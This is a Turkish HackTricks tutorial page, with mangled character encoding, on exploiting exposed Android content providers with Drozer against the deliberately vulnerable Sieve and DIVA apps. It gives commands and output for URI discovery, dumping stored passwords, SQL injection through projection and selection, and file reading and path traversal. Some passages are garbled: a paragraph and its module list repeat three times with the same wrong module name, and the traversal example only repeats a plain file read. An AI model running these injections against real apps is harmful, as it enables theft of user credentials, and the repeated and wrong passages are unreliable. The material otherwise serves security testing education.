# Ä°Ã§erik SaÄŸlayÄ±cÄ±larÄ±ndan Yararlanma

## Ä°Ã§erik SaÄŸlayÄ±cÄ±larÄ±ndan Yararlanma

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'ler**](https://opensea.io/collection/the-peass-family)imizi gÃ¶rÃ¼n
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## GiriÅŸ

Veri, bir bileÅŸen olan **iÃ§erik saÄŸlayÄ±cÄ±** aracÄ±lÄ±ÄŸÄ±yla diÄŸer uygulamalara istek Ã¼zerine **aktarÄ±lÄ±r**. Bu istekler, **ContentResolver sÄ±nÄ±fÄ±** yÃ¶ntemleri aracÄ±lÄ±ÄŸÄ±yla yÃ¶netilir. Ä°Ã§erik saÄŸlayÄ±cÄ±larÄ±, verilerini **veritabanÄ±**, **dosyalar** veya bir **aÄŸ** Ã¼zerinde depolayabilir.

_Manifest.xml_ dosyasÄ±nda, iÃ§erik saÄŸlayÄ±cÄ±nÄ±n bildirimi gereklidir. Ã–rneÄŸin:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
`content://com.mwr.example.sieve.DBContentProvider/Keys` adresine eriÅŸmek iÃ§in `READ_KEYS` izni gereklidir. Ä°lginÃ§ olan ÅŸudur ki, `/Keys/` yoluna aÅŸaÄŸÄ±daki bÃ¶lÃ¼mde eriÅŸilebilir, Ã§Ã¼nkÃ¼ geliÅŸtirici `/Keys`'i gÃ¼vence altÄ±na almÄ±ÅŸ ancak `/Keys/` olarak belirtmiÅŸtir.

**Belki Ã¶zel verilere eriÅŸebilir veya bazÄ± zafiyetleri (SQL Injection veya Path Traversal) sÃ¶mÃ¼rebilirsiniz.**

## **AÃ§Ä±ÄŸa Ã§Ä±karÄ±lmÄ±ÅŸ iÃ§erik saÄŸlayÄ±cÄ±lardan** bilgi alÄ±n
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
**DBContentProvider**'a nasÄ±l ulaÅŸÄ±lacaÄŸÄ±nÄ± "_content://_" ile baÅŸlayan URI'ler kullanarak birleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r. Bu yaklaÅŸÄ±m, Drozer kullanÄ±rken elde edilen bilgilerin _/Keys_ dizininde bulunmasÄ±ndan elde edilen bilgilerden yola Ã§Ä±karak oluÅŸturulmuÅŸtur.

Drozer, **birkaÃ§ URI tahmin edip deneyebilir**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
**ContentProvider kodunu** sorgulamak iÃ§in aÅŸaÄŸÄ±daki gibi kontrol edebilirsiniz:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

AyrÄ±ca, tam sorgularÄ± bulamazsanÄ±z, ContentProvider tarafÄ±ndan `onCreate` yÃ¶nteminde bildirilen isimleri kontrol edebilirsiniz:

![](<../../../.gitbook/assets/image (186).png>)

Sorgu ÅŸu ÅŸekilde olacaktÄ±r: `content://paketin.adÄ±.sÄ±nÄ±fÄ±n.adÄ±/bildirilen_isim`

## **VeritabanÄ± destekli Content Provider'lar**

Muhtemelen Content Provider'larÄ±n Ã§oÄŸu bir **veritabanÄ±** iÃ§in bir **arayÃ¼z** olarak kullanÄ±lÄ±r. Bu nedenle, eriÅŸebilirseniz bilgiyi **Ã§Ä±karmak, gÃ¼ncellemek, eklemek ve silmek** mÃ¼mkÃ¼n olabilir.\
Hassas bilgilere **eriÅŸebilip eriÅŸemediÄŸinizi kontrol edin** veya yetkilendirme mekanizmalarÄ±nÄ± **atlamak** iÃ§in deÄŸiÅŸtirmeyi deneyin.

Content Provider'Ä±n kodunu kontrol ederken, ayrÄ±ca _query, insert, update ve delete_ gibi adlara sahip **fonksiyonlarÄ±** arayÄ±n:

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Ã‡Ã¼nkÃ¼ onlarÄ± Ã§aÄŸÄ±rabilirsiniz.

### Ä°Ã§eriÄŸi sorgula
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Ä°Ã§erik ekleme

VeritabanÄ±nÄ± sorgulayarak **sÃ¼tunlarÄ±n adÄ±nÄ±** Ã¶ÄŸrenebilirsiniz, ardÄ±ndan DB'ye veri ekleyebilirsiniz:

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_Not: Ekleme ve gÃ¼ncelleme iÅŸlemlerinde --string ile string, --double ile double, --float, --integer, --long, --short, --boolean ile belirtebilirsiniz._

### Ä°Ã§eriÄŸi gÃ¼ncelleme

SÃ¼tunlarÄ±n adÄ±nÄ± bildiÄŸinizde, giriÅŸleri deÄŸiÅŸtirebilirsiniz:

![](<../../../.gitbook/assets/image (190).png>)

### Ä°Ã§eriÄŸi silme

![](<../../../.gitbook/assets/image (191).png>)

### **SQL Injection**

**SQL enjeksiyonunu** (SQLite) test etmek oldukÃ§a basittir, iÃ§erik saÄŸlayÄ±cÄ±ya iletilen **projeksiyon** ve **seÃ§im alanlarÄ±nÄ±** manipÃ¼le ederek yapÄ±lÄ±r.\
Ä°Ã§erik saÄŸlayÄ±cÄ±yÄ± sorgularken, bilgi aramak iÃ§in 2 ilginÃ§ argÃ¼man vardÄ±r: _--selection_ ve _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

Bu **parametreleri** kÃ¶tÃ¼ye kullanarak **SQL enjeksiyonunu** test edebilirsiniz:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Drozer ile Otomatik SQLInjection KeÅŸfi**

Drozer, Android uygulamalarÄ±nda otomatik olarak SQLInjection zafiyetlerini keÅŸfetmek iÃ§in kullanÄ±labilir. Bu, uygulama iÃ§indeki iÃ§erik saÄŸlayÄ±cÄ±larÄ± hedef alÄ±r ve SQLInjection saldÄ±rÄ±larÄ±na karÅŸÄ± potansiyel olarak savunmasÄ±z olan noktalarÄ± tespit eder.

Drozer'Ä±n SQLInjection keÅŸfi iÃ§in kullanÄ±lan birkaÃ§ modÃ¼lÃ¼ vardÄ±r. Bu modÃ¼ller, uygulama iÃ§indeki iÃ§erik saÄŸlayÄ±cÄ±larÄ±nÄ± analiz eder ve SQLInjection saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z olanlarÄ± belirler. Bu modÃ¼ller, otomatik olarak SQLInjection saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirir ve sonuÃ§larÄ± raporlar.

Drozer'Ä±n SQLInjection keÅŸfi iÃ§in kullanÄ±lan modÃ¼llerinden bazÄ±larÄ± ÅŸunlardÄ±r:

- `content.provider.finduri`: Bu modÃ¼l, uygulama iÃ§indeki tÃ¼m iÃ§erik saÄŸlayÄ±cÄ±larÄ±nÄ± bulur.
- `content.provider.finduri`: Bu modÃ¼l, uygulama iÃ§indeki tÃ¼m iÃ§erik saÄŸlayÄ±cÄ±larÄ±nÄ± bulur.
- `content.provider.finduri`: Bu modÃ¼l, uygulama iÃ§indeki tÃ¼m iÃ§erik saÄŸlayÄ±cÄ±larÄ±nÄ± bulur.

Bu modÃ¼ller, uygulama iÃ§indeki iÃ§erik saÄŸlayÄ±cÄ±larÄ±nÄ± analiz eder ve SQLInjection saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z olanlarÄ± belirler. Bu modÃ¼ller, otomatik olarak SQLInjection saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirir ve sonuÃ§larÄ± raporlar.

Drozer'Ä±n SQLInjection keÅŸfi iÃ§in kullanÄ±lan modÃ¼llerinden bazÄ±larÄ± ÅŸunlardÄ±r:

- `content.provider.finduri`: Bu modÃ¼l, uygulama iÃ§indeki tÃ¼m iÃ§erik saÄŸlayÄ±cÄ±larÄ±nÄ± bulur.
- `content.provider.finduri`: Bu modÃ¼l, uygulama iÃ§indeki tÃ¼m iÃ§erik saÄŸlayÄ±cÄ±larÄ±nÄ± bulur.
- `content.provider.finduri`: Bu modÃ¼l, uygulama iÃ§indeki tÃ¼m iÃ§erik saÄŸlayÄ±cÄ±larÄ±nÄ± bulur.

Bu modÃ¼ller, uygulama iÃ§indeki iÃ§erik saÄŸlayÄ±cÄ±larÄ±nÄ± analiz eder ve SQLInjection saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z olanlarÄ± belirler. Bu modÃ¼ller, otomatik olarak SQLInjection saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirir ve sonuÃ§larÄ± raporlar.
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **Dosya Sistemi Destekli Ä°Ã§erik SaÄŸlayÄ±cÄ±larÄ±**

Ä°Ã§erik saÄŸlayÄ±cÄ±larÄ±, **dosyalara eriÅŸmek iÃ§in** de kullanÄ±labilir:

![](<../../../.gitbook/assets/image (193).png>)

### **Dosya** okuma

Ä°Ã§erik saÄŸlayÄ±cÄ±sÄ±ndan dosyalarÄ± okuyabilirsiniz.
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **Yol GeÃ§iÅŸi**

Dosyalara eriÅŸebiliyorsanÄ±z, Yol GeÃ§iÅŸi'ni (bu durumda gerekli olmasa da "_../_" ve benzer hileleri deneyebilirsiniz) kÃ¶tÃ¼ye kullanmaya Ã§alÄ±ÅŸabilirsiniz.
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Drozer ile Otomatik Yol GeÃ§idi KeÅŸfi**

Drozer, Android uygulamalarÄ±nda otomatik olarak yol geÃ§idi keÅŸfi yapabilen bir araÃ§tÄ±r. Bu yÃ¶ntem, uygulamanÄ±n iÃ§erisindeki hassas verilere eriÅŸmek iÃ§in kullanÄ±labilir. Drozer, uygulamanÄ±n iÃ§erisindeki iÃ§erik saÄŸlayÄ±cÄ±larÄ± hedef alarak otomatik olarak yol geÃ§idi keÅŸfi yapar.

Drozer'Ä±n yol geÃ§idi keÅŸfi yapabilmesi iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Drozer'Ä± Ã§alÄ±ÅŸtÄ±rÄ±n ve hedef Android cihazÄ±na baÄŸlanÄ±n.
2. `run app.provider.find` komutunu kullanarak yol geÃ§idi keÅŸfi taramasÄ±nÄ± baÅŸlatÄ±n.
3. Drozer, uygulamanÄ±n iÃ§erisindeki tÃ¼m iÃ§erik saÄŸlayÄ±cÄ±larÄ±nÄ± taramaya baÅŸlayacak ve potansiyel yol geÃ§itlerini bulacaktÄ±r.
4. Bulunan yol geÃ§itlerini inceleyerek, uygulamanÄ±n hassas verilerine eriÅŸebilirsiniz.

Bu yÃ¶ntem, uygulamanÄ±n iÃ§erisindeki hassas verilere eriÅŸmek iÃ§in etkili bir yol saÄŸlar. Ancak, bu iÅŸlemi yasal ve etik sÄ±nÄ±rlar iÃ§erisinde gerÃ§ekleÅŸtirmeniz Ã¶nemlidir.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## Referanslar

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
